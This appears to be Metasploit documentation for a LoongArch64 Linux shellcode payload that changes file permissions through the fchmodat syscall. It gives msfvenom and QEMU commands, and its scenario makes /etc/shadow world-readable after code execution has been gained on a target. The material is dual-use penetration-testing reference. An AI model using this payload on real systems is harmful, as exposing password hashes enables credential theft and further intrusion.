## Vulnerable Application

This payload targets Linux systems running on the LoongArch64 architecture. It uses the
`fchmodat` syscall (syscall number 53) to change the permissions of a specified file, then
exits cleanly via the `exit` syscall (syscall number 93).

The payload is a 48-byte position-independent shellcode stub. It is suitable for use in
exploits targeting LoongArch64 Linux systems where arbitrary code execution has been achieved.

## Verification Steps

1. Generate the payload as an ELF executable:
   ```
   ./msfvenom -p linux/loongarch64/chmod FILE=/tmp/testfile MODE=0777 -f elf -o chmod.elf
   chmod +x chmod.elf
   ```
2. Run it under QEMU user-mode emulation:
   ```
   qemu-loongarch64 -strace ./chmod.elf
   ```
3. Confirm the `fchmodat` syscall was made and returned 0:
   ```
   fchmodat(AT_FDCWD,"/tmp/testfile",0777,0) = 0
   exit(0)
   ```
4. Verify the file permissions changed:
   ```
   ls -la /tmp/testfile
   ```

## Options

### FILE

The full path of the file to chmod on the target system. Defaults to `/etc/shadow`.

### MODE

The desired file permissions in octal notation (e.g. `0777`, `0666`, `0644`). Defaults to `0666`.
Must not exceed `0xFFF` (octal `07777`).

## Scenarios

### LoongArch64 Linux — making /etc/shadow world-readable

This scenario demonstrates using the payload to make `/etc/shadow` readable after gaining
code execution on a LoongArch64 Linux target.

#### Version and OS: LoongArch64 Linux (tested with qemu-loongarch64)

Generate the payload:

```
msf6 > use payload/linux/loongarch64/chmod
msf6 payload(linux/loongarch64/chmod) > set FILE /etc/shadow
FILE => /etc/shadow
msf6 payload(linux/loongarch64/chmod) > set MODE 0644
MODE => 0644
msf6 payload(linux/loongarch64/chmod) > generate -f elf -o /tmp/chmod.elf
[*] Writing 168 bytes to /tmp/chmod.elf...
```

Run on target (or via QEMU for testing):

```
$ qemu-loongarch64 -strace /tmp/chmod.elf
fchmodat(AT_FDCWD,"/etc/shadow",0644,0) = 0
exit(0)
```
